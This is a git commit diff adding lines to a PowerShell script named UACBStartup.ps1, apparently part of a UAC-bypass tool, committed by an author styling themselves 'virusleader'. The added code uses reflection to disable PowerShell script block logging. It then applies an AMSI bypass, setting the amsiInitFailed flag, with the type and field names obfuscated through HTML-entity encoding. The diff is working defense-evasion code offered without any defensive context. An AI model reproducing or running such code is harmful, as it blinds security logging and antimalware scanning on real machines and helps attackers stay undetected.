594b7c76dcbf983dc6f42bb41bab5083f3c0d600
GєṭRєҡṭBȏʏ724/ <virusleader324@gmail.com>
2021-02-28 20:14:24 +0700

    Add files via upload

--- UACBStartup.ps1
+++ UACBStartup.ps1
@@ -1,3 +1,8 @@
+$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
+[Ref].Assembly.GetType($([sYSTEM.Net.WebuTILITy]::HTmldECODE('&#83;&#121;&#115;&#116;&#101;&#109;&#46;&#77;&#97;&#110;&#97;&#103;&#101;&#109;&#101;&#110;&#116;&#46;&#65;&#117;&#116;&#111;&#109;&#97;&#116;&#105;&#111;&#110;&#46;&#65;&#109;&#115;&#105;&#85;&#116;&#105;&#108;&#115;'))).GetField(''+$([sYstEm.net.webutilIty]::hTMldECOde('&#97;&#109;&#115;&#105;'))+'InitFailed','NonPublic,Static').SetValue($null,$true);
 function MPEB {
 	param (
 		[Parameter(Mandatory = $True)]
